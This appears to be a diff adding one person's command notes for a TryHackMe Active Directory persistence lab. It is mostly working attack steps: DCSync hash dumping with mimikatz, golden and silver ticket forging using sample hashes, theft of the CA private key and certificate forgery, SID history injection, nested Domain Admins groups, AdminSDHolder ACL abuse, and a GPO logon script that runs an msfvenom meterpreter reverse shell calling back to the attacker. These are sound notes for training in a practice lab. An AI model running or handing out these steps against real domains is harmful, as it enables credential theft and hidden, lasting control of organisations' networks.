@@ -1,0 +1,211 @@
+### persisting AD ###
+## links ##
+https://tryhackme.com/room/persistingad
+
+
+###########################
+## persist through creds ##
+###########################
+# harvest creds with your onwed Administrator domain acocunt
+C:\Tools\mimikatz_trunk\x64\mimikatz.exe
+mimikatz # lsadump::dcsync /domain:za.tryhackme.loc /user:<your-low-priv-account>	# test with your low account
+mimikatz # log leo_dcdump.txt 								# enable log
+mimikatz # lsadump::dcsync /domain:za.tryhackme.loc /all				# gather all ntlm hashes
+cat leo_dcdump.txt | grep "SAM Username"						# cat username
+cat leo_dcdump.txt | grep "Hash NTLM"							# all hashes
+cat leo_dcdump.txt | grep "SAM Username         : krbtgt" -A 10				# grep a user info
+
+
+#############################
+## persist through tickets ##
+#############################
+# To forge a golden ticket, we need the KRBTGT account pass hash so that we can sign TGT for any account we want
+# Policies for tickets are set in TGT itself. we could put inside it that our ticket is valid for 10 years
+# Rotate the krbtgt account pass is painful, because almost all services in env will stop working
+# Silver ticket is TGS, no interaction with DC. Only log on host itself if silver ticket is used
+# we already have KRBTGT NTLM hash, we could just connect with a low account
+## GOLDEN
+ssh za.tryhackme.loc\\sean.hopkins@thmwrk1.za.tryhackme.loc				# connect to a machine
+Get-ADDomain										# get DomainSID
+C:\Tools\mimikatz_trunk\x64\mimikatz.exe
+mimikatz # kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /krbtgt:<NTLM hash of KRBTGT account> /endin:600 /renewmax:10080 /ptt
+mimikatz # kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-2693558621-2658995185 /krbtgt:16f9af38fca3ada405386b3b57366082 /endin:600 /renewmax:10080 /ptt
+
+/admin - The username we want to impersonate. This does not have to be a valid user.
+/domain - The FQDN of the domain we want to generate the ticket for.
+/id -The user RID. By default, Mimikatz uses RID 500, which is the default Administrator account RID.
+/sid -The SID of the domain we want to generate the ticket for.
+/krbtgt -The NTLM hash of the KRBTGT account.
+/endin - The ticket lifetime. By default, Mimikatz generates a ticket that is valid for 10 years. The default Kerberos policy of AD is 10 hours (600 minutes)
+/renewmax -The maximum ticket lifetime with renewal. By default, Mimikatz generates a ticket that is valid for 10 years. The default Kerberos policy of AD is 7 days (10080 minutes)
+/ptt - This flag tells Mimikatz to inject the ticket directly into the session, meaning it is ready to be used.
+
+dir \\thmdc.za.tryhackme.loc\c$\							# check if valid
+
+## SILVER
+mimikatz # kerberos::golden /admin:StillNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /target:<Hostname of server being targeted> /rc4:<NTLM Hash of machine account of target> /service:cifs /ptt
+mimikatz # kerberos::golden /admin:StillNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-2693558621-2658995185 /target:THMSERVER1.za.tryhackme.loc /rc4:4c02d970f7b3da7f8ab6fa4dc77438f4 /service:cifs /ptt
+
+/admin - The username we want to impersonate. This does not have to be a valid user.
+/domain - The FQDN of the domain we want to generate the ticket for.
+/id -The user RID. By default, Mimikatz uses RID 500, which is the default Administrator account RID.
+/sid -The SID of the domain we want to generate the ticket for.
+/target - The hostname of our target server. Let's do THMSERVER1.za.tryhackme.loc, but it can be any domain-joined host.
+/rc4 - The NTLM hash of the machine account of our target. Look through your DC Sync results for the NTLM hash of THMSERVER1$. The $ indicates that it is a machine account.
+/service - The service we are requesting in our TGS. CIFS is a safe bet, since it allows file access.
+/ptt - This flag tells Mimikatz to inject the ticket directly into the session, meaning it is ready to be used.
+
+dir \\thmserver1.za.tryhackme.loc\c$\							# check if valid
+
+
+#############################
+## persist through certifs ##
+#############################
+# VERY INVASIVE TECHNIQUES, NEVER DO IT IN REAL WORLD
+# We could steal the private key of the root CA's to generate our own certifs.
+# Blue team has no ability to revoke them. They have to do a rotation of the CA.
+## Extract the private KEY
+ssh za.tryhackme.loc\\Administrator@THMDC.za.tryhackme.loc				# log on DC
+C:\Tools\mimikatz_trunk\x64\mimikatz.exe						# launch mimikatz
+mimikatz # crypto::certificates /systemstore:local_machine				# check certifs
+mimikatz # privilege::debug
+mimikatz # crypto::capi									# patch memory to allow an
+mimikatz # crypto::cng									# export of certificates
+mimikatz # crypto::certificates /systemstore:local_machine /export			# now export certifs
+dir											# check exported certif
+05/10/2022  12:12 PM             1,423 local_machine_My_0_.der
+05/10/2022  12:12 PM             3,299 local_machine_My_0_.pfx
+05/10/2022  12:12 PM               939 local_machine_My_1_za-THMDC-CA.der
+05/10/2022  12:12 PM             2,685 local_machine_My_1_za-THMDC-CA.pfx
+05/10/2022  12:12 PM             1,534 local_machine_My_2_THMDC.za.tryhackme.loc.der
+05/10/2022  12:12 PM             3,380 local_machine_My_2_THMDC.za.tryhackme.loc.pfx
+05/10/2022  12:12 PM             1,465 local_machine_My_3_.der
+05/10/2022  12:12 PM             3,321 local_machine_My_3_.pfx
+# By default, Mimikatz assigns the password of mimikatz
+
+# Now we could forge Client Auth cert with https://github.com/GhostPack/ForgeCert
+C:\Tools\ForgeCert\ForgeCert.exe --CaCertPath za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123
+
+CaCertPath - The path to our exported CA certificate.
+CaCertPassword - The password used to encrypt the certificate. By default, Mimikatz assigns the password of mimikatz.
+Subject - The subject or common name of the certificate. This does not really matter in the context of what we will be using the certificate for.
+SubjectAltName - This is the User Principal Name (UPN) of the account we want to impersonate with this certificate. It has to be a legitimate user.
+NewCertPath - The path to where ForgeCert will store the generated certificate.
+NewCertPassword - Since the certificate will require the private key exported for authentication purposes, we must set a new password used to encrypt it.
+
+# Now request a TGT to check if certif is valid
+C:\Tools\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:fullAdmin.pfx /password:Password123 /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:10.200.61.101
+C:\Tools\mimikatz_trunk\x64\mimikatz.exe						# use mimikatz to load TGT
+mimikatz # kerberos::ptt administrator.kirbi						# load TGT
+dir \\THMDC.za.tryhackme.loc\c$\							# check if it works
+
+
+#################################
+## Persist through SID history ##
+#################################
+# Require Domain Admin privileges
+ssh za.tryhackme.loc\\sean.hopkins@thmwrk1.za.tryhackme.loc				# connect to low account
+Get-ADUser sean.hopkins -properties sidhistory,memberof					# check if no SID history
+ssh za.tryhackme.loc\\Administrator@THMDC.za.tryhackme.loc				# connect to DC with Admin
+Get-ADGroup "Domain Admins"								# get SID of Domain Admin
+# https://github.com/MichaelGrafnetter/DSInternals
+# to patch the ntds.dit file (AD database)
+Stop-Service -Name ntds -force								# dont let it down too long!
+Add-ADDBSidHistory -SamAccountName 'sean.hopkins' -SidHistory '???' -DatabasePath C:\Windows\NTDS\ntds.dit
+Start-Service -Name ntds
+# connect back to low user account and check again SID history
+ssh za.tryhackme.loc\\sean.hopkins@thmwrk1.za.tryhackme.loc
+Get-ADUser sean.hopkins -Properties sidhistory						# check new SID history
+dir \\thmdc.za.tryhackme.loc\c$								# check if it works!
+
+
+######################################
+## Persist through Group Membership ##
+######################################
+# IT Support group is a good group, having ability to reset passwords
+# Local admin group is also good OR Group with ownership over GPOs
+# Adding ourself to a subgroup is better. Subgroup of IT Support for example
+ssh za.tryhackme.loc\\Administrator@THMDC.za.tryhackme.loc				# connect to DC admin
+# Add group and subgroup NOT MANDATORY (WILL DAMAGE AD ARCHI)
+# Add subgroup to IT
+New-ADGroup -Path "OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "Leo Net Group 1" -SamAccountName "Leo_nestgroup1" -DisplayName "Leo Nest Group 1" -GroupScope Global -GroupCategory Security
+# Then Sale
+New-ADGroup -Path "OU=SALES,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "Leo Net Group 2" -SamAccountName "Leo_nestgroup2" -DisplayName "Leo Nest Group 2" -GroupScope Global -GroupCategory Security 
+Add-ADGroupMember -Identity "Leo_nestgroup2" -Members "Leo_nestgroup1"			# nest group
+# Then consulting
+New-ADGroup -Path "OU=CONSULTING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "Leo Net Group 3" -SamAccountName "Leo_nestgroup3" -DisplayName "Leo Nest Group 3" -GroupScope Global -GroupCategory Security
+Add-ADGroupMember -Identity "Leo_nestgroup3" -Members "Leo_nestgroup2"			# nest group
+# Then marketing
+New-ADGroup -Path "OU=MARKETING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "Leo Net Group 4" -SamAccountName "Leo_nestgroup4" -DisplayName "Leo Nest Group 4" -GroupScope Global -GroupCategory Security
+Add-ADGroupMember -Identity "Leo_nestgroup4" -Members "Leo_nestgroup3"			# nest group
+# Then IT
+New-ADGroup -Path "OU=IT,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "Leo Net Group 5" -SamAccountName "Leo_nestgroup5" -DisplayName "Leo Nest Group 5" -GroupScope Global -GroupCategory Security
+Add-ADGroupMember -Identity "Leo_nestgroup5" -Members "Leo_nestgroup4"			# nest group
+Add-ADGroupMember -Identity "Domain Admins" -Members "Leo_nestgroup5"			# nest with Domain Admins
+Add-ADGroupMember -Identity "Leo_nestgroup1" -Members "sean.hopkins"			# Add yourself
+
+Get-ADGroupMember -Identity "Domain Admins"						# check it has new member
+ssh za.tryhackme.loc\\sean.hopkins@thmwrk1.za.tryhackme.loc				# connect back to low user
+dir \\thmdc.za.tryhackme.loc\c$\							# check access
+
+
+##########################
+## Persist through ACLs ##
+##########################
+# AdminSDHolder, a template, refresh every 60min.
+runas /netonly /user:Administrator cmd.exe						# dont RDP, better runas
+mmc											# launch MMC
+# enable Advanced Features
+AD users and computer > domain.com > System > AdminSDHolder
+Right-clic > Properties > Security
+Add > Check Names > Ok > Allow on Full Control > Apply > Ok				# add our low user
+# Wait 60min, SDProp service will exec auto every 60min and propagate changes OR:
+Import-Module .\Invoke-ADSDPropagation.ps1
+Invoke-ADSDPropagation									# force propagation
+
+
+##########################
+## Persist through GPOs ##
+##########################
+# The following are some common GPO persistence techniques:
+- Restricted Group Membership - This could allow us administrative access to all hosts in the domain
+- Logon Script Deployment - Ensure that we get a shell callback every time a user auth to a host in the domain.
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=$ip lport=4444 -f exe > sh.exe
+# script.bat
+copy \\za.tryhackme.loc\sysvol\za.tryhackme.loc\scripts\sh.exe C:\tmp\sh.exe && timeout /t 20 && C:\tmp\sh.exe
+# copy both
+scp sh.exe za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/
+scp script.bat za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/
+# then listen
+msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST $ip; set LPORT 4444;exploit"
+# now create the GPO to exec it, RDP into one workstation, and runas as administrator
+MMC											# launch MMR
+File > Add/remove snap-in > Group POlicy Management > Add > Ok				# open GPO manager
+Right-clien on the "Admins" OU > Select Create a GPO > Link it here and name it
+Right-click on new policy > select Enforced > Right-click > edit
+# get back on GPO management
+COnfiguration > Policies > windows settings
+select Scripts (login/logoff) > right-clic logon->Properties > select Scripts tab > Add > Browse
+# select your batch file as the script, click open and OK. APply. OK.
+Click on your policy > click on delegation						# by def all admin can edit
+right-click on ENTERPRISE DOMAIN CONTROLLER > select Edit settings, delete, mod...
+Clic on all other group (except Authicated users) and click remove			# auhed user and EDC left
+Clic on advanced and remove the Created Owner from permissions
+# let by default all authed user to read policy, this is required
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
